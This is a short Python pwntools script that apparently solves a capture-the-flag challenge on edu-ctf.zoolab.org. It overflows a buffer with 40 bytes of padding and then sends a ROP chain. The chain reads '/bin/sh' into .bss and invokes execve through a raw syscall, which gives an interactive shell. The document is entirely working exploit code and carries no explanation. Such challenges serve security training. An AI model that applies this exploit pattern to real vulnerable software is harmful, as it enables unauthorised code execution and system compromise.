from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
p = remote( 'edu-ctf.zoolab.org', 10003 )
#p = process('./chal')

p.recvuntil(b"show me rop\n> ")

pop_rax_ret = 0x447b27
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
bss = 0x4c8000
main = 0x401745
read = 0x4470c0
syscall = 0x401bf4

payload = b'a' * 40
payload += p64( pop_rdi_ret ) + p64( 0 )
payload += p64( pop_rsi_ret ) + p64( bss )
payload += p64( pop_rdx_rbx_ret ) + p64( 8 ) + p64( 0 )
payload += p64( read )
payload += p64( pop_rsi_ret ) + p64( bss )
payload += p64( pop_rax_ret ) + p64( 0x3b )
payload += p64( pop_rdi_ret ) + p64( bss )
payload += p64( pop_rsi_ret ) + p64( 0 )
payload += p64( pop_rdx_rbx_ret ) + p64( 0 ) + p64( 0 )
payload += p64( syscall )

#gdb.attach( p )
p.sendline( payload )
input('>')
p.sendline(b'/bin/sh\x00')


p.interactive()
